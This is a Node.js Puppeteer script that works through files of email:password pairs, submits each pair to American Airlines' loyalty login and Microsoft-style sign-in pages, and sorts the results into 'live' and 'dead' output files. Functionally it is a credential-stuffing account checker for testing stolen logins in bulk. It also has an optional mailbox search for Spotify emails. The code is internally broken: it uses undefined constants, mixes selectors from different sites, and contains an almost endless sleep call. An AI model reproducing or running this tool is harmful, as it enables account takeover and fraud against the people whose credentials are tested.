const puppeteer = require("puppeteer");
const fs = require("fs").promises;
const path = require("path");
const readline = require("readline");
const chalk = require("chalk");

const LOGIN_URL = "https://www.aa.com/loyalty/login"; // Your login URL
// const MAILBOX_URL = "https://outlook.live.com/owa/..."; // Your mailbox URL

const stats = { total: 0, checked: 0, live: 0, dead: 0 };
const debug = true;

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const log = (message, color = 'blue') => {
    if (debug) {
        const timestamp = new Date().toLocaleString();
        console.log(chalk[color](`[${timestamp}] ${message}`));
    }
};

async function ensureFolderExists(folderPath) {
    try {
        await fs.access(folderPath);
    } catch {
        await fs.mkdir(folderPath, { recursive: true });
    }
}

async function readFilters(filePath) {
    try {
        const data = await fs.readFile(filePath, "utf8");
        return data.trim().split("\n").filter(Boolean);
    } catch {
        return null;
    }
}

async function askToProceedWithoutFilters() {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => {
        rl.question("No filters found. Proceed without filtering? (y/n): ", answer => {
            rl.close();
            resolve(answer.toLowerCase() === "y");
        });
    });
}

async function waitForNavigation(page, options = {}) {
    try {
        await Promise.race([
            page.waitForNavigation({ waitUntil: "networkidle0", timeout: 30000, ...options }),
            new Promise(resolve => setTimeout(resolve, 30000))
        ]);
    } catch (error) {
        log("Navigation timeout or error occurred. Continuing...", "yellow");
    }
}

async function checkEmailWithPuppeteer(email, password, filters, liveWriter, deadWriter) {
    let browser;
    try {
        browser = await puppeteer.launch({ headless: false });
        const page = await browser.newPage();
        await page.setDefaultNavigationTimeout(60000);

        log(`Attempting login for: ${email}`, 'blue');

        // await page.goto('https://www.aa.com/homePage.do', { waitUntil: "networkidle0" });

        // await Promise.all([
        //     page.click(".button-login"),
        //     waitForNavigation(page)
        // ]);

        await page.goto("https://www.aa.com/loyalty/login?uri=%2floyalty%2flogin&previousPage=%2FhomePage.do%3Flocale=en_US&from=comp_nav", { waitUntil: "networkidle0" });
        await page.type("#loginId", email);
        await page.type('#password', password);
        await Promise.all([
            page.click("#button_login"),
            waitForNavigation(page)
        ]);
        await sleep(10000000000000)
        try {
            await page.waitForSelector("#i0116Error", { timeout: 1000 });
            const errorMsg = await page.$eval(
                EMAIL_ERROR_SELECTOR,
                (el) => el.textContent
            );
            log(`❌ Email error: ${errorMsg}`, "red");
            deadWriter.write(`${email}:${password} | Email Error: ${errorMsg}\n`);
            return;
        } catch (e) {
            // No email error, proceed
        }

        const passwordSelector = "#i0118";
        try {
            await page.waitForSelector(passwordSelector, { timeout: 1000 });
        } catch {
            log(`Password field not found for ${email}`, "red");
            deadWriter.write(`${email}:${password} | Error: Password field not found\n`);
            return;
        }

        await page.type(passwordSelector, password);
        await Promise.all([
            page.click("#idSIButton9"),
            waitForNavigation(page)
        ]);


        const PASSWORD_ERROR_SELECTOR = "#i0118Error";
        const ACCOUNT_LOCKED = "#idTD_Error";

        try {
            const currentUrl = page.url();
            // console.log(currentUrl)
            if (currentUrl.includes("/signin") || currentUrl.includes("recover?") || currentUrl.includes("Abuse?") || currentUrl.includes("cancel?")) {
                log(`Login failed for ${email}`, "red");
                deadWriter.write(`${email}:${password} | Error: Login failed\n`);
                return;
            }

            await page.waitForSelector(PASSWORD_ERROR_SELECTOR, { timeout: 2000 }).catch(() => null);
            await page.waitForSelector(ACCOUNT_LOCKED, { timeout: 2000 }).catch(() => null);

            let passwordErrorMsg = await page.$(PASSWORD_ERROR_SELECTOR);
            if (passwordErrorMsg) {
                let errorMsg = await page.$eval(PASSWORD_ERROR_SELECTOR, (el) => el.textContent);
                log(`❌ Password error: ${errorMsg}`, "red");
                deadWriter.write(`${email}:${password} | Password Error: ${errorMsg}\n`);
                return;
            }

            let accountLockedMsg = await page.$(ACCOUNT_LOCKED);
            if (accountLockedMsg) {
                let errorMsg = await page.$eval(ACCOUNT_LOCKED, (el) => el.textContent);
                log(`❌ Account locked error: ${errorMsg}`, "red");
                deadWriter.write(`${email}:${password} | Account Locked: ${errorMsg}\n`);
                return;
            }

        } catch (e) {
            // No error found, proceed
        }

        // Handle "Stay signed in?" prompt if it appears
        try {
            await page.waitForSelector('#acceptButton', { timeout: 3000 });
            await Promise.all([
                page.click('#acceptButton'),
                waitForNavigation(page)
            ]);
        } catch {
        }

        log(`Login successful for ${email}`, "green");

        // Perform email search and filtering here if needed
        await page.goto(MAILBOX_URL, { waitUntil: "networkidle0" });

        const searchboxselector = '#topSearchInput';
        try {
            await page.waitForSelector(searchboxselector, { timeout: 3000 });
            await Promise.all([
                page.type(searchboxselector, 'from:"no-reply@spotify.com"'),
                page.click('button[aria-label="Search"]', { timeout: 2000 }),
                waitForNavigation(page)
            ]);
        } catch {
        }

        try {
            await page.waitForSelector('.jGG6V.gDC9O', { timeout: 5000 });
            const results = await page.$$eval('.jGG6V.gDC9O', elements => elements.length);
            log(`Found ${results} result(s).`);
        } catch (e) {
            log('No search results found or search timed out.');
        }


        stats.live++;
        liveWriter.write(`${email}:${password}\n`);

    } catch (error) {
        log(`Error for ${email}:`, error.message, "red");
        deadWriter.write(`${email}:${password} | Error: ${error.message}\n`);
        stats.dead++;
    } finally {
        if (browser) await browser.close();
        stats.checked++;
    }
}

async function processFile(inputFile, filters) {
    const outputFolder = path.join(process.cwd(), "output");
    await ensureFolderExists(outputFolder);

    const baseName = path.basename(inputFile, ".txt");
    const liveFile = path.join(outputFolder, `${baseName}_live.txt`);
    const deadFile = path.join(outputFolder, `${baseName}_dead.txt`);

    const liveWriter = await fs.open(liveFile, "a");
    const deadWriter = await fs.open(deadFile, "a");

    const data = await fs.readFile(inputFile, "utf8");
    const lines = data.trim().split("\n");
    stats.total += lines.length;

    for (let line of lines) {
        const [email, password] = line.split(":");
        await checkEmailWithPuppeteer(email.trim(), password.trim(), filters, liveWriter, deadWriter);
        await sleep(1000); // Add delay between requests
    }

    await liveWriter.close();
    await deadWriter.close();
}

async function main() {
    const filters = await readFilters(path.join(__dirname, "filter.txt"));

    if (!filters && !(await askToProceedWithoutFilters())) {
        log("Process aborted due to missing or empty filter.txt.", "red");
        return;
    }

    const inputFolder = path.join(process.cwd(), "input");
    const inputFiles = await fs.readdir(inputFolder);
    const txtFiles = inputFiles.filter(file => file.endsWith(".txt"));

    if (txtFiles.length === 0) {
        log("No .txt files found in the input folder.", "red");
        process.exit(1);
    }

    for (const inputFile of txtFiles) {
        await processFile(path.join(inputFolder, inputFile), filters);
    }

    log("\nAuthentication process completed.", "blue");
    log(`Total: ${stats.total}, Checked: ${stats.checked}, Live: ${stats.live}, Dead: ${stats.dead}`, "cyan");
}

main().catch(console.error);